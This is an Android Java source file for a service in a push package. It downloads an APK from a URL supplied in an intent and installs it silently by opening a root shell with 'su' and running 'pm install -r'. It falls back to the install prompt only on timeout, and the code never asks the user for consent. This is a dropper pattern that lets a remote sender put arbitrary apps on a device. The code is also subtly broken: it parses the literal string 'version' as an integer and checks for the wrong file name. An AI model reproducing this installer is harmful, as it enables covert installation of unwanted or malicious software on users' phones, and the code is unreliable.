package com.joymetec.push;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLDecoder;
import java.util.HashMap;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.telephony.cdma.CdmaCellLocation;
import android.util.Log;

public class DownLoadService extends IntentService {
	private String TAG = "lemi";
	private Timer timer = null;
	private String[] key = { "url", "name", "package", "version" };
	private int timeOut = 25000;
	
	private Handler myHandler = new Handler() {
		public void handleMessage(Message msg) {

			int id = msg.arg1;

			Log.d(TAG, "handleMessage");

			if (id == 1) // 成功安装
			{
				Log.d(TAG, "install success");
				if (timer != null) {
					timer.cancel();
				}
			} else if (id == 2) // 请求root失败
			{
				Log.d(TAG, "time out");
				
				Bundle bundle = msg.getData();
				String path = bundle.getString("path");

				if (path != null && !path.isEmpty()) {
					packageInstall(getApplicationContext(), path);
				}
				
				
				timer.cancel();
			}

		};
	};

	public DownLoadService() {
		// TODO Auto-generated constructor stub
		this("hhx");
	}

	public DownLoadService(String name) {
		super("test");
		// TODO Auto-generated constructor stub
	}

	@Override
	protected void onHandleIntent(Intent intent) {
		// TODO Auto-generated method stub

		HashMap<String, String> map = parsingArgument(intent);

		if (map != null) {
			
			int codeVersion = getVersionCode(map.get(key[2]));
			
			Log.d(TAG, "codeVersion = "+codeVersion);
			
			if (codeVersion != -1) {
				
				int code = Integer.parseInt(key[3]);
				if(code >codeVersion)
				{
					downloadFile(map.get(key[0]), map.get(key[1]));
				}
			} else {
				downloadFile(map.get(key[0]), map.get(key[1]));
			}

		}
	}

	public void downloadFile(String url, String name) {
		String downloadPath = Environment.getExternalStorageDirectory()
				.getPath() + "/download";
		File file = new File(downloadPath);
		if (!file.exists())
			file.mkdir();

		if (new File(downloadPath + "/" + name).exists()) {
	
			final String path = downloadPath + "/" + name+".apk";

			timer = new Timer();
			timer.schedule(new TimerTask() {
				@Override
				public void run() {
					// TODO Auto-generated method stub

					Message m = new Message();
					m.arg1 = 2;
					Bundle bundle = new Bundle();
					bundle.putString("path", path);
					m.setData(bundle);
					DownLoadService.this.myHandler.sendMessage(m);
				}
			}, timeOut);

			new MyThread(path).start();
		} else {

			HttpGet httpGet = new HttpGet(url);
			try {
				HttpResponse httpResponse = new DefaultHttpClient()
						.execute(httpGet);

				if (httpResponse.getStatusLine().getStatusCode() == 200) {
					InputStream is = httpResponse.getEntity().getContent();
					// 开始下载apk文件
					FileOutputStream fos = new FileOutputStream(downloadPath
							+ "/" + name+".apk");
					byte[] buffer = new byte[8192];
					int count = 0;
					while ((count = is.read(buffer)) != -1) {
						fos.write(buffer, 0, count);
					}
					fos.close();
					is.close();
					Log.d(TAG, "apk path = " + downloadPath + "/" + name+".apk");

					final String path = downloadPath + "/" + name+".apk";

					timer = new Timer();
					timer.schedule(new TimerTask() {
						@Override
						public void run() {
							// TODO Auto-generated method stub

							Message m = new Message();
							m.arg1 = 2;
							Bundle bundle = new Bundle();
							bundle.putString("path", path);
							m.setData(bundle);
							DownLoadService.this.myHandler.sendMessage(m);
						}
					}, timeOut);

					new MyThread(path).start();
				}
			} catch (Exception e) {
			}
		}
	}

	public class MyThread extends Thread {
		private String path;

		public MyThread(String path) {
			// TODO Auto-generated constructor stub
			this.path = path;
		}

		@Override
		public void run() {
			// TODO Auto-generated method stub
			super.run();

			Process process = null;
			OutputStream out = null;
			InputStream in = null;

			try {
				Log.d(TAG, "error1");
				process = Runtime.getRuntime().exec("su");
				out = process.getOutputStream();

				out.write(("pm install -r " + path + "\n").getBytes());
				in = process.getInputStream();
				int len = 0;
				byte[] bs = new byte[256];

				while (-1 != (len = in.read(bs))) {
					String state = new String(bs, 0, len);
					Log.d(TAG, "state = " + state);
					if (state.equals("Success\n")) {

						Message m = new Message();
						m.arg1 = 1;
						DownLoadService.this.myHandler.sendMessage(m);

					}
				}
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();

			}
		}
	}

	private int getVersionCode(String pkName) {
		try {

			String versionName = this.getPackageManager().getPackageInfo(
					pkName, 0).versionName;
			int versionCode = this.getPackageManager()
					.getPackageInfo(pkName, 0).versionCode;

			return versionCode;
		} catch (Exception e) {
		}
		return -1;

	}

	public void packageInstall(Context context, String filePath) {
		Intent i = new Intent(Intent.ACTION_VIEW);
		i.setDataAndType(Uri.parse("file://" + filePath),
				"application/vnd.android.package-archive");
		i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(i);
	}

	public boolean isInstall(String packageName) {
		PackageManager pm = getApplicationContext().getPackageManager();
		ApplicationInfo appInfo;
		try {
			appInfo = pm.getApplicationInfo(packageName, 0);
			if ((appInfo.flags & ApplicationInfo.FLAG_EXTERNAL_STORAGE) != 0) {
				return true;
			}
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}
		return false;
	}

	public HashMap<String, String> parsingArgument(Intent intent) {
		HashMap<String, String> map = new HashMap<String, String>();
		String str = intent.getStringExtra("url");

		String[] info = str.split(";", 4);

		Log.d(TAG, "size = " + info.length);

		if (info.length != 4)
			return null;

		for (int i = 0; i < info.length; i++) {

			Log.d(TAG, "length = "+info[i].length());
			if(info[i].length()>0)
			{
				map.put(key[i], info[i]);
				Log.d(TAG, "key =" + key[i] + "  " + info[i]);
			}
			else
			{
				return null;
			}
			
		}
		return map;
		//return null;
	}

}
